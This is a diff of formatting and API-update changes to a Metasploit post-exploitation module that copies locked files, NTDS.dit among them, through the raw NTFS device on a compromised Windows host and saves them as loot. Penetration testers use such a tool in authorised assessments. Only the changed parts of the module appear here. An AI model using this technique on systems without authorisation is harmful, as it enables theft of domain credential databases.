@@ -1,9 +1,7 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'rex/parser/fs/ntfs'
 
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Priv
@@ -12,32 +10,48 @@ class MetasploitModule < Msf::Post
   ERROR = Msf::Post::Windows::Error
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'         => 'Windows File Gather File from Raw NTFS',
-      'Description'  => %q{
-        This module gathers a file using the raw NTFS device, bypassing some Windows restrictions
-        such as open file with write lock. Because it avoids the usual file locking issues, it can
-        be used to retrieve files such as NTDS.dit.
-      },
-      'License'      => 'MSF_LICENSE',
-      'Platform'     => ['win'],
-      'SessionTypes' => ['meterpreter'],
-      'Author'       => ['Danil Bazin <danil.bazin[at]hsc.fr>'], # @danilbaz
-      'References'   => [
-        [ 'URL', 'http://www.amazon.com/System-Forensic-Analysis-Brian-Carrier/dp/0321268172/' ]
-      ]
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows File Gather File from Raw NTFS',
+        'Description' => %q{
+          This module gathers a file using the raw NTFS device, bypassing some Windows restrictions
+          such as open file with write lock. Because it avoids the usual file locking issues, it can
+          be used to retrieve files such as NTDS.dit.
+        },
+        'License' => MSF_LICENSE,
+        'Platform' => ['win'],
+        'SessionTypes' => ['meterpreter'],
+        'Author' => ['Danil Bazin <danil.bazin[at]hsc.fr>'], # @danilbaz
+        'References' => [
+          [ 'URL', 'http://www.amazon.com/System-Forensic-Analysis-Brian-Carrier/dp/0321268172/' ]
+        ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_railgun_api
+            ]
+          }
+        }
+      )
+    )
 
     register_options(
       [
         OptString.new('FILE_PATH', [true, 'The FILE_PATH to retreive from the Volume raw device', nil])
-      ], self.class)
+      ]
+    )
   end
 
   def run
-    winver = sysinfo["OS"]
+    version = get_version_info
 
-    fail_with(Failure::NoTarget, 'Module not valid for Windows 2000') if winver =~ /2000/
+    fail_with(Failure::NoTarget, 'Module not valid for Windows 2000') if version.build_number == Msf::WindowsVersion::Win2000
     fail_with(Failure::NoAccess, 'You don\'t have administrative privileges') unless is_admin?
 
     file_path = datastore['FILE_PATH']
@@ -69,20 +83,20 @@ class MetasploitModule < Msf::Post
     end
 
     @handle = r['return']
-    vprint_status("Successfuly opened #{drive}")
+    vprint_good("Successfully opened #{drive}")
     begin
       @bytes_read = 0
       fs = Rex::Parser::NTFS.new(self)
       print_status("Trying to gather #{file_path}")
       path = file_path[3, file_path.length - 3]
       data = fs.file(path)
-      file_name = file_path.split("\\")[-1]
-      stored_path = store_loot("windows.file", 'application/octet-stream', session, data, file_name, "Windows file")
+      file_name = file_path.split('\\')[-1]
+      stored_path = store_loot('windows.file', 'application/octet-stream', session, data, file_name, 'Windows file')
       print_good("Saving file : #{stored_path}")
     ensure
       client.railgun.kernel32.CloseHandle(@handle)
     end
-    print_status("Post Successful")
+    print_status('Post Successful')
   end
 
   def read(size)
